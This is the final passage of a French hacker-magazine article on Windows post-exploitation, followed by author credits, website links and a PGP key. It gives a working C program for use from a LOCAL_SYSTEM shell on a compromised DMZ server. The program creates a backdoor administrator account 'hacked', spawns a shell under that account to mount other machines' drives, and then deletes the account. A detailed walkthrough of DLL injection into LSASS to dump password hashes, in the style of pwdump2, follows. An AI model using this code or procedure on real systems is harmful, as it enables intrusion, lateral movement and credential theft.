+Même en spécifiant les références avec par example
+"net use * \\autre_machine\c$ pippo /user:administrator", si nous somme
+LOCAL_SYSTEM le système operatif nous dira qu'il n'a pas trouvé le séance
+correcte de logon à utiliser pour s'authentifier à la ressource distante.
+
+Imagimez de réussir à exploiter un service d'un server sur une DMZ et que dans
+la même DMZ ils y soient des autres machines avec le service NetBios ouvert,
+mais pas accessible par l'extérieur (par example il y a un firewall).
+Il nous plairait monter les disques de ces autres machines (qui très
+probablement ont des password banales) en se servant de la machine que nous
+avons exploité, mais Windows nous le permet pas parceque, si nous somme
+LOCAL_SYSTEM, nous n'avons pas une séance de logon complete.
+
+Ehi, mais quand même, nous somme LOCAL_SYSTEM, nous avons le privilège
+d'exécuter du code comme fesant part du système opératif, il y sera bien
+quelque chose que nous pouvons faire!
+
+Evidemment ils y sont plusieurs façons pour détourner ce problème.
+Nous allons voir la métode plus simple.
+
+Il suffira uploader sur le server exploité (par example à travers TFTP) un
+petit programme qui fait ceci:
+
+- Créer un nouveau usager.
+- Ajouter cet usager au groupe Aministrators (c'est pas indispensable dans la
+  plupart des cas, mais vu que nous y somme...).
+- Créer une séance de LogOn pour cet usager avec LogonUser (nous pouvons le
+  faire parceque nous avons le privilège SE_TCB_NAME).
+- Exécuter un processus avec le Token de cet usager (par example un autre
+  cmd.exe).
+- Attendre que le processus fils soit terminé.
+- Eliminer l'usager créé.
+
+A présent, en envoyant ce programme de notre shell de LOCAL_SYSTEM, nous aurons
+une deuxième shell comme un normale administrateur de la machine, grace auquel
+nous pourrons utiliser "net use" et monter conbien de disques nous voulons!!!!
+
+N.B.
+Créer un nouveau usager est nécéssaire à condition de ne pas connaitre la
+password (demandée par LogonUser) d'un autre utilisateur valide du système.
+
+N.B.2
+A la place de cmd.exe vous pouvez lancer la commande qui plus vous plait.
+
+N.B.3
+Tout ceci peut être fait directement aussi de l'intérieur du shellcode, mais il
+nous sembre un emploi d'énergie inutile.
+
+Voici le code d'example:
+
+<-| awex/not_LOCAL_SYSTEM.c |->
+#include <Windows.h>
+
+int main(int argc,char **argv)
+{
+	STARTUPINFO StartInfos;
+	PROCESS_INFORMATION Proc_Infos;
+	HANDLE Token;
+
+	system("net user hacked hacked /ADD");
+	system("net localgroup administrators hacked /ADD");
+
+	// Si le service n'a pas droppé le privilège SE_TCB_NAME nous créons une
+	// séance intéractive pour l'usager
+	LogonUser("hacked",NULL,"hacked",LOGON32_LOGON_INTERACTIVE,LOGON32_PROVIDER_DEFAULT, (PHANDLE)&Token);
+
+	// Nous remplissons la structure nécessaire à CreateProcessAsUser
+	GetStartupInfo((LPSTARTUPINFO)&StartInfos);
+
+	// Sur quelques ServicePack il est nécessaire laisser au SO la gestion du Desktop
+	StartInfos.lpDesktop = "";
+	StartInfos.dwFlags&=(!STARTF_USESTDHANDLES);
+
+	CreateProcessAsUser(Token, NULL, "cmd.exe", NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS, NULL, NULL, (LPSTARTUPINFO)&StartInfos, (LPPROCESS_INFORMATION)&Proc_Infos);
+
+	WaitForSingleObject(Proc_Infos.hProcess, INFINITE);
+
+	system("net user hacked /DELETE");
+
+	return 0;
+}
+<-X->
+
+
+
+//////////////////////
+// 8- DLL INJECTION //
+//////////////////////
+
+Même si nous pouvions avoir les privilèges de Administrator (ou de
+LOCAL_SYSTEM), notre code ne pourra quand même pas accéder directement à
+certaine donnés sensibles qui soient été "locked" par des autres processus, ou
+qui soient contenues en mémoire dans des espaces d'adressement différents du
+notre.
+
+Pour éviter ce problème nous pouvons faire usage du privilège SE_DEBUG_NAME et
+d'une technique connue comme "DLL Injection".
+
+La technique "DLL Injection" consiste à faire exécuter à un processus une
+fonction contenue dans une dll "malicieuse" créé par nous. Cette fonction
+tournera dans le même context du processus victime comme Thread.
+
+Cette technique est utilisé par example par le programme pwdump2 pour récupérer
+les hash des password des usager, même sur les systèmes qui usent la SYSKEY.
+
+Même dans ce cas nous ne reporterons pas le code par entier, vu que vous pouvez
+le trouver facilement sur le Réseau.
+
+Le code suit plus ou moins ces points:
+
+- Il abilite le privilège SE_DEBUG_NAME dans le cas ou il soit possedé par le
+  processus, mais pas activé. Les fonctions utilisées sont les suivantes:
+
+  - OpenProcessToken     : pour obtenir le Token du processus qui l'appèle.
+  - LookupPrivilegeValue : pour obtenir le LUID de SE_DBUG_NAME.
+  - AdjustTokenPrivileges: pour activer le privilège dans le Token du
+			   processus.
+
+- Obtient un handle au processus LSASS:
+
+  - NtQuerySystemInformation: pour obtenir une liste de structures process_info
+			      qui contient les noms et les PID des processus
+			      actifs (Internal Windows Function).
+  - RtlCompareUnicodeString : pour trouver la entry de LSASS.EXE et, en suite,
+			      obtenir le PID.
+  - OpenProcess             : pour obtenir l'handle au processus LSASS.
+
+- En se servant des privilèges possédés et l'handle obtenu, il réserve une zone
+  de mémoire à l'intérieur du prosessus LSASS. Dans cette zone de mémoire il
+  copiera le code et les donnés qui seront utilisés en suite. Dans la zone des
+  donnés elles sont presentes, entre autres, les adresses des fonctions de
+  librairie (obtenues avec GetProcAddress) qui seront utilisées par le code.
+
+  - VirtualAllocEx    : pour réserver une zone de mémoire à l'intérieur du
+			processus LSASS.
+  - GetProcAddress    : pour obtenir les pointeurs aux fonctions de kernel32
+			que le code injecté devra utiliser.
+  - WriteProcessMemory: pour écrire les donnés et le code nécessaire en suite.
+
+- Crée un Thread de LSASS qui exécutera le code injecté.
+
+  - CreateRemoteThread : pour créer le Thread distant. Ce Thread exécutera la
+			 fonction injectée. CreateRemoteThread passe à la
+			 fonction injectée, comme paramètre, le pointeur à la
+			 zone des donnés alloué en précédance.
+
+- A présent la fonction injectée est exécuté par un thread de LSASS. Cette
+  fonction utilise le paramètre passé par CreateRemoteThread pour accéder à sa
+  zone de donnés. Comme nous avons vu auparavant, la zone des donnés contient
+  les pointeurs aux fontions de kernel32 que le code utilisera.
+  Ces fonctions sont:
+
+  - LoadLibrary    : pour charger la dll "malicieuse" à l'intérieur du
+		     processus LSASS.
+  - GetProcAddress : pour obtenir le pointeur à la fonction exportée de la dll
+		     "malicieuse" qui exécutera les opérations voulues (dans ce
+		     cas la recherche des hash des password).
+  - FreeLibrary    : pour "décharger" la dll.
+
+- Le code injecté pourra appeler la fonction exportée de la dll "malicieuse".
+  Cette fonction marchera dans le context de LSASS et donc elle aura un accès
+  direct à toutes ses resources et à toutes ses donnés en mémoire.
+
+  Le code aurait aussi pu exécuter toutes les opérations voulues directement
+  par la fonction injectée, sans avoir besoin de s'appuyer à une dll externe.
+  L'avantage d'utiliser une dll externe est que tous les symboles importés de
+  la cette dll seront résolus automatiquement au moment de son chargement.
+  Au contraire, seul le code injecté a besoin d'avoir les pointeurs à tous les
+  symboles (fonctions) qu'il utilise. Ces symboles doivent être resolus par le
+  programme d'exploit qui lance le thread, et passés à lui, vu que le thread
+  lancé comme ça n'aura même pas le "symbole" GetProcAddress résolu (même si il
+  aurait pu utiliser une technique de résolution des symboles semblable à celle
+  présentée dans le shellcode pour obtenir ce pointeur).
+  Donc il s'agit d'un choix fait pour netteté et légèreté du code.
+
+  La fonction de la dll "malicieuse", dans le cas de pwdump2, utilisera à
+  présent des API pour obtenir les hash des password.
+
+N.B.
+Le programme d'exploit communique avec le thread "injecté" dans LSASS à travers
+NamedPipe. La pipe est utilisée pour reçevoir l'output du thread (dans ce cas
+les hash des password).
+
+
+
+/////////////////////////////////////
+// 9- CONCLUSIONS ET REMERCIEMENTS //
+/////////////////////////////////////
+
+Nous somme arrivés à la fin. Nous espérons que les mille et plus lignes écrites
+de notre main puissent être utile à quelqu'un.
+Evidemment cet article ne prétend pas de couvrir tous les aspects liés à la
+Windows Security, qui reste un territoire pour certain aspect encore inexploré.
+Justement pour ça, idées et propositons sont bien acceptées.
+Nous nous excusons pour les éventuels erreurs ou oublis présents dans le
+document.
+Si quelqu'un veut nous payer pour ce PAPER, il devrait evidemment le faire avec
+des PAPER-Dollar (buahahahah, excusez moi mais après tout cet article c'est la
+meilleure blague qui nous est venu à l'idée).
+
+Cut/Paste de mes saluts usuels avec profusion de upper/lower case, cifres et
+ponctuation qui font très l337.
+
+NaGA:    Marco Valleri    -  crwm@freemail.it  (oui, celui de ettercap)
+KiodOpz: Massimo Chiodini -  max.chiodo@libero.it  (oui, celui des KTools)
+
+P.S.
+Nous le savons, freemail et libero ne font pas beaucoup de scéne comme account
+de poste. Mais qu'est ce que vous voulez, nous avons toujour eu malchance avec
+nos account. Si quelqu'un veut nous offrir deux forwarder avec un nom très l337
+ce serait bien accepter :P
+
+P.S.2
+Ah, nous avons oublié d'écrire la nourriture consommé et la musique écouté
+pendant l'écriture de l'article. Si quelqu'un est intéressé au sujet il peut
+nous contacter à travers l'e-mail.
+
+
+
+////////////
+// FIN ? //
+////////////
+
+
+
+-[ WEB ]----------------------------------------------------------------------
+
+        http://www.bfi.cx
+        http://bfi.freaknet.org
+        http://www.s0ftpj.org/bfi/
+
+
+-[ E-MAiL ]-------------------------------------------------------------------
+
+        bfi@s0ftpj.org
+
+
+-[ PGP ]----------------------------------------------------------------------
+
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+Version: 2.6.3i
+mQENAzZsSu8AAAEIAM5FrActPz32W1AbxJ/LDG7bB371rhB1aG7/AzDEkXH67nni
+DrMRyP+0u4tCTGizOGof0s/YDm2hH4jh+aGO9djJBzIEU8p1dvY677uw6oVCM374
+nkjbyDjvBeuJVooKo+J6yGZuUq7jVgBKsR0uklfe5/0TUXsVva9b1pBfxqynK5OO
+lQGJuq7g79jTSTqsa0mbFFxAlFq5GZmL+fnZdjWGI0c2pZrz+Tdj2+Ic3dl9dWax
+iuy9Bp4Bq+H0mpCmnvwTMVdS2c+99s9unfnbzGvO6KqiwZzIWU9pQeK+v7W6vPa3
+TbGHwwH4iaAWQH0mm7v+KdpMzqUPucgvfugfx+kABRO0FUJmSTk4IDxiZmk5OEB1
+c2EubmV0PokBFQMFEDZsSu+5yC9+6B/H6QEBb6EIAMRP40T7m4Y1arNkj5enWC/b
+a6M4oog42xr9UHOd8X2cOBBNB8qTe+dhBIhPX0fDJnnCr0WuEQ+eiw0YHJKyk5ql
+GB/UkRH/hR4IpA0alUUjEYjTqL5HZmW9phMA9xiTAqoNhmXaIh7MVaYmcxhXwoOo
+WYOaYoklxxA5qZxOwIXRxlmaN48SKsQuPrSrHwTdKxd+qB7QDU83h8nQ7dB4MAse
+gDvMUdspekxAX8XBikXLvVuT0ai4xd8o8owWNR5fQAsNkbrdjOUWrOs0dbFx2K9J
+l3XqeKl3XEgLvVG8JyhloKl65h9rUyw6Ek5hvb5ROuyS/lAGGWvxv2YJrN8ABLo=
+=o7CG
+-----END PGP PUBLIC KEY BLOCK-----
+
+
+==============================================================================
+-----------------------------------[ EOF ]------------------------------------
+==============================================================================
